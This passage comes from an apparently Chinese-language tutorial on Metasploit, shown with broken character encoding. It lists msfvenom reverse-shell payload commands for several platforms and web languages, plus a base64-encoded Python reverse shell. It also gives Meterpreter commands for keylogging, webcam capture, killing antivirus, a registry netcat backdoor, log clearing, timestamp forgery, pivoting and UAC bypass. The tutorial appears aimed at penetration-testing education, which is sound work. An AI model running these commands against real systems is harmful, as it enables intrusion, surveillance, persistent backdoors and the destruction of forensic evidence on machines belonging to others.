‡å‡†é€‰é¡¹</span><br><span class="line">-o, --out   &lt;path&gt;               ä¿å­˜payload</span><br><span class="line">-v, --var-name &lt;name&gt;            æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡ï¼Œä»¥ç¡®å®šè¾“å‡ºæ ¼å¼</span><br><span class="line">    --shellest                   æœ€å°åŒ–ç”Ÿæˆpayload</span><br><span class="line">-h, --help                       æŸ¥çœ‹å¸®åŠ©é€‰é¡¹</span><br><span class="line">    --help-formats               æŸ¥çœ‹msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨</span><br></pre></td></tr></table></figure>1.å¯æ‰§è¡Œç¨‹åºLinux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åå‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">æ­£å‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šç›´æ¥å¤åˆ¶å¯æ‰§è¡Œç¨‹åºåˆ°ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œå°±è¡Œäº†ã€‚2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šå°†shell.phpæ”¾åœ¨webç›®å½•ä¸‹ï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼Œæˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>3.è„šæœ¬shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šå¤åˆ¶shell.pyä¸­çš„å†…å®¹åœ¨linuxå‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-MeterpreteråŸºæœ¬å‘½ä»¤-1"><a href="#4-MeterpreteråŸºæœ¬å‘½ä»¤-1" class="headerlink" title="4. MeterpreteråŸºæœ¬å‘½ä»¤"></a>4. MeterpreteråŸºæœ¬å‘½ä»¤</h2>é¦–å…ˆéœ€è¦å…ˆè·å–meterpreterï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(è®¡åˆ’ä»»åŠ¡ä¸‹è¿›è¡Œæ”»å‡»ï¼Œåå°) -z(æ”»å‡»å®Œæˆä¸é‡ä¼šè¯äº¤äº’)</span><br><span class="line">jobs  # æŸ¥çœ‹åå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">kill &lt;id&gt;  # åœæ­¢æŸåå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">sessions -l  # (æŸ¥çœ‹ä¼šè¯)</span><br><span class="line">sessions -i 2   # é€‰æ‹©ä¼šè¯</span><br><span class="line">sessions -k 2   # ç»“æŸä¼šè¯</span><br></pre></td></tr></table></figure>å¦‚æœå…ˆè·å–äº†cmdï¼Œæ¯”å¦‚åˆ©ç”¨ms17-010ï¼Œé»˜è®¤ä½¿ç”¨çš„payloadè¿”å›çš„å°±æ˜¯cmdã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>sessions-u 2</code>æ¥å°†cmdshellå‡çº§æˆmeterpreterã€‚è·å–åˆ°äº†meterpreterï¼Œå°±å¯ä»¥è¿›è¡Œåæ¸—é€äº†ã€‚<h3 id="4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤-1"><a href="#4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤-1" class="headerlink" title="4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤"></a>4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># ä¼šè¯ç®¡ç†</span><br><span class="line">background  #å°†å½“å‰ä¼šè¯æ”¾ç½®åå°</span><br><span class="line">sessions  # æŸ¥çœ‹ä¼šè¯</span><br><span class="line">sessions -i  # åˆ‡æ¢ä¼šè¯</span><br><span class="line">quit  # å…³é—­å½“å‰çš„ä¼šè¯ï¼Œè¿”å›msfç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># ç³»ç»Ÿè®¾ç½®</span><br><span class="line">sysinfo  # æŸ¥çœ‹ç›®æ ‡æœºç³»ç»Ÿä¿¡æ¯</span><br><span class="line">idletime  # æŸ¥çœ‹ç›®æ ‡æœºé—²ç½®æ—¶é—´</span><br><span class="line">reboot/shutdown   # é‡å¯/å…³æœº</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # è·å¾—æ§åˆ¶å°æƒé™</span><br><span class="line">irb  # è¿›å…¥rubyç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># è¿›ç¨‹è¿ç§»</span><br><span class="line">getpid    # è·å–å½“å‰è¿›ç¨‹çš„pid</span><br><span class="line">ps   # æŸ¥çœ‹å½“å‰æ´»è·ƒè¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line">kill &lt;pidå€¼&gt;   #æ€æ­»è¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line"></span><br><span class="line"># æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute #åœ¨ç›®æ ‡æœºä¸­æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute -H -i -f cmd.exe # åˆ›å»ºæ–°è¿›ç¨‹cmd.exeï¼Œ-Hä¸å¯è§ï¼Œ-iäº¤äº’</span><br><span class="line"></span><br><span class="line"># æ‘„åƒå¤´å‘½ä»¤</span><br><span class="line">webcam_list  #æŸ¥çœ‹æ‘„åƒå¤´åˆ—è¡¨</span><br><span class="line">webcam_chat  # æŸ¥çœ‹æ‘„åƒå¤´æ¥å£</span><br><span class="line">webcam_snap   #é€šè¿‡æ‘„åƒå¤´æ‹ç…§</span><br><span class="line">webcam_stream   #é€šè¿‡æ‘„åƒå¤´å¼€å¯è§†é¢‘</span><br><span class="line"></span><br><span class="line"># uictlå¼€å…³é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #å¼€å¯æˆ–ç¦æ­¢é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl disable mouse  #ç¦ç”¨é¼ æ ‡</span><br><span class="line">uictl disable keyboard  #ç¦ç”¨é”®ç›˜</span><br><span class="line"></span><br><span class="line"># è¿œç¨‹æ¡Œé¢/æˆªå±</span><br><span class="line">enumdesktops  #æŸ¥çœ‹å¯ç”¨çš„æ¡Œé¢</span><br><span class="line">getdesktop    #è·å–å½“å‰meterpreter å…³è”çš„æ¡Œé¢</span><br><span class="line">screenshot  #æˆªå±</span><br><span class="line">use espia  #æˆ–è€…ä½¿ç”¨espiaæ¨¡å—æˆªå±  ç„¶åè¾“å…¥screengrab</span><br><span class="line">run vnc  #ä½¿ç”¨vncè¿œç¨‹æ¡Œé¢è¿æ¥</span><br><span class="line"></span><br><span class="line"># é”®ç›˜è®°å½•</span><br><span class="line">keyscan_start  #å¼€å§‹é”®ç›˜è®°å½•</span><br><span class="line">keyscan_dump   #å¯¼å‡ºè®°å½•æ•°æ®</span><br><span class="line">keyscan_stop #ç»“æŸé”®ç›˜è®°å½•</span><br><span class="line"></span><br><span class="line"># æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line"># å¼€å¯rdpæ˜¯é€šè¿‡regä¿®æ”¹æ³¨å†Œè¡¨ï¼›æ·»åŠ ç”¨æˆ·æ˜¯è°ƒç”¨cmd.exe é€šè¿‡net useræ·»åŠ ï¼›ç«¯å£è½¬å‘æ˜¯åˆ©ç”¨çš„portfwdå‘½ä»¤</span><br><span class="line">run post/windows/manage/enable_rdp  #å¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #æ·»åŠ ç”¨æˆ·</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #å°†3389ç«¯å£è½¬å‘åˆ°6662</span><br><span class="line"></span><br><span class="line"># å…³é—­é˜²ç—…æ¯’è½¯ä»¶</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹æ³¨å†Œè¡¨</span><br><span class="line">reg â€“h # æ³¨å†Œè¡¨å‘½ä»¤å¸®åŠ©</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #ä¸Šä¼ nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #æšä¸¾runä¸‹çš„key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #è®¾ç½®é”®å€¼</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #æŸ¥çœ‹é”®å€¼</span><br><span class="line">nc -v 192.168.81.162 443  #æ”»å‡»è€…è¿æ¥ncåé—¨</span><br><span class="line"></span><br><span class="line"># æ¸…ç†æ—¥å¿—</span><br><span class="line">clearav  #æ¸…é™¤windowsä¸­çš„åº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—</span><br></pre></td></tr></table></figure><h3 id="4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤-1"><a href="#4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤-1" class="headerlink" title="4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤"></a>4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # åŸºæœ¬å‘½ä»¤</span><br><span class="line">search -f *pass* -d C:\\windows # æœç´¢æ–‡ä»¶  -hæŸ¥çœ‹å¸®åŠ©</span><br><span class="line">getwd/pwd  # è·å–å½“å‰ç›®å½•</span><br><span class="line">getlwd/lpwd   # æ“ä½œæ”»å‡»è€…ä¸»æœº æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # ä¸‹è½½æ–‡ä»¶</span><br><span class="line">edit c:\\1.txt  # ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶  æ²¡æœ‰çš„è¯ï¼Œä¼šæ–°å»ºæ–‡ä»¶</span><br><span class="line">mkdir lltest2  # åªèƒ½åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹</span><br><span class="line">rmdir lltest2  # åªèƒ½åˆ é™¤å½“å‰ç›®å½•ä¸‹æ–‡ä»¶å¤¹</span><br><span class="line">lcd /tmp   # æ“ä½œæ”»å‡»è€…ä¸»æœº åˆ‡æ¢ç›®å½•</span><br><span class="line"></span><br><span class="line"># timestompä¼ªé€ æ–‡ä»¶æ—¶é—´æˆ³</span><br><span class="line">timestomp C:// -h   #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">timestomp -v C://2.txt   #æŸ¥çœ‹æ—¶é—´æˆ³</span><br><span class="line">timestomp C://2.txt -f C://1.txt #å°†1.txtçš„æ—¶é—´æˆ³å¤åˆ¶ç»™2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-ç½‘ç»œå‘½ä»¤-1"><a href="#4-3-ç½‘ç»œå‘½ä»¤-1" class="headerlink" title="4.3 ç½‘ç»œå‘½ä»¤"></a>4.3 ç½‘ç»œå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># åŸºæœ¬</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat â€“ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #æŸ¥çœ‹ä»£ç†ä¿¡æ¯</span><br><span class="line">route   #æŸ¥çœ‹è·¯ç”±</span><br><span class="line"></span><br><span class="line"># portfwdç«¯å£è½¬å‘</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # å°†ç›®æ ‡æœºçš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°6666ç«¯å£</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #ç„¶åä½¿ç”¨rdesktopæ¥è¿æ¥ï¼Œ-u ç”¨æˆ·å -p å¯†ç </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ·»åŠ è·¯ç”±</span><br><span class="line"></span><br><span class="line"># æ–¹å¼ä¸€autoroute ï¼ˆdeprecatedï¼‰</span><br><span class="line">run autoroute â€“h #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run autoroute -s 192.168.2.0/24  #æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run autoroute â€“p  #æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line"># æ–¹å¼äºŒpost/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #è‡ªåŠ¨æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run post/multi/manage/autoroute CMD=print # æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># ç„¶åå¯ä»¥åˆ©ç”¨arp_scannerã€portscanç­‰è¿›è¡Œæ‰«æ</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autorouteæ·»åŠ å®Œè·¯ç”±åï¼Œè¿˜å¯ä»¥åˆ©ç”¨msfè‡ªå¸¦çš„æ¨¡å—è¿›è¡Œsocksä»£ç†</span><br><span class="line"># msfæä¾›äº†2ä¸ªæ¨¡å—ç”¨æ¥åšsocksä»£ç†ã€‚</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># å…ˆbackgroundé€€å‡ºæ¥ï¼Œç„¶åï¼š</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># ç„¶åvi /etc/proxychains.conf #æ·»åŠ  socks5 127.0.0.1 1080</span><br><span class="line"># æœ€åproxychains ä½¿ç”¨Socks5ä»£ç†è®¿é—®</span><br><span class="line"></span><br><span class="line"># snifferæŠ“åŒ…</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #æŸ¥çœ‹ç½‘å¡</span><br><span class="line">sniffer_start 2   #é€‰æ‹©ç½‘å¡ å¼€å§‹æŠ“åŒ…</span><br><span class="line">sniffer_stats 2   #æŸ¥çœ‹çŠ¶æ€</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #å¯¼å‡ºpcapæ•°æ®åŒ…</span><br><span class="line">sniffer_stop 2   #åœæ­¢æŠ“åŒ…</span><br></pre></td></tr></table></figure><h3 id="4-4-ä¿¡æ¯æ”¶é›†-1"><a href="#4-4-ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="4.4 ä¿¡æ¯æ”¶é›†"></a>4.4 ä¿¡æ¯æ”¶é›†</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># ä¿¡æ¯æ”¶é›†çš„è„šæœ¬ä½äºï¼š</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># ä»¥ä¸‹åˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„</span><br><span class="line">run post/windows/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/linux/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/windows/gather/forensics/enum_drives #æŸ¥çœ‹åˆ†åŒº</span><br><span class="line">run post/windows/gather/enum_applications #è·å–å®‰è£…è½¯ä»¶ä¿¡æ¯</span><br><span class="line">run post/windows/gather/dumplinks   #è·å–æœ€è¿‘çš„æ–‡ä»¶æ“ä½œ</span><br><span class="line">run post/windows/gather/enum_ie  #è·å–IEç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_chrome   #è·å–Chromeç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_patches  #è¡¥ä¸ä¿¡æ¯</span><br><span class="line">run post/windows/gather/enum_domain  #æŸ¥æ‰¾åŸŸæ§</span><br></pre></td></tr></table></figure><h3 id="4-5-ææƒ-1"><a href="#4-5-ææƒ-1" class="headerlink" title="4.5 ææƒ"></a>4.5 ææƒ</h3>1.getsystemææƒ<br>getsystemå·¥ä½œåŸç†ï¼š<br>â‘ getsystemåˆ›å»ºä¸€ä¸ªæ–°çš„WindowsæœåŠ¡ï¼Œè®¾ç½®ä¸ºSYSTEMè¿è¡Œï¼Œå½“å®ƒå¯åŠ¨æ—¶è¿æ¥åˆ°ä¸€ä¸ªå‘½åç®¡é“ã€‚<br>â‘¡getsystemäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªå‘½åç®¡é“å¹¶ç­‰å¾…æ¥è‡ªè¯¥æœåŠ¡çš„è¿æ¥ã€‚<br>â‘¢WindowsæœåŠ¡å·²å¯åŠ¨ï¼Œå¯¼è‡´ä¸å‘½åç®¡é“å»ºç«‹è¿æ¥ã€‚<br>â‘£è¯¥è¿›ç¨‹æ¥æ”¶è¿æ¥å¹¶è°ƒç”¨ImpersonateNamedPipeClientï¼Œä»è€Œä¸ºSYSTEMç”¨æˆ·åˆ›å»ºæ¨¡æ‹Ÿä»¤ç‰Œã€‚<br>ç„¶åç”¨æ–°æ”¶é›†çš„SYSTEMæ¨¡æ‹Ÿä»¤ç‰Œäº§ç”Ÿcmd.exeï¼Œå¹¶ä¸”æˆ‘ä»¬æœ‰ä¸€ä¸ªSYSTEMç‰¹æƒè¿›ç¨‹ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>2.bypassuac<br>ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUACï¼‰æ˜¯å¾®è½¯åœ¨ Windows Vista ä»¥åç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæœ‰åŠ©äºé˜²æ­¢å¯¹ç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„æ›´æ”¹ã€‚åº”ç”¨ç¨‹åºå’Œä»»åŠ¡å¯å§‹ç»ˆåœ¨éç®¡ç†å‘˜å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œé™¤éç®¡ç†å‘˜ä¸“é—¨ç»™ç³»ç»Ÿæˆäºˆç®¡ç†å‘˜çº§åˆ«çš„è®¿é—®æƒé™ã€‚UAC å¯ä»¥é˜»æ­¢æœªç»æˆæƒçš„åº”ç”¨ç¨‹åºè¿›è¡Œè‡ªåŠ¨å®‰è£…ï¼Œå¹¶é˜²æ­¢æ— æ„ä¸­æ›´æ”¹ç³»ç»Ÿè®¾ç½®ã€‚msfæä¾›äº†å¦‚ä¸‹å‡ ä¸ªæ¨¡å—å¸®åŠ©ç»•è¿‡UACï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              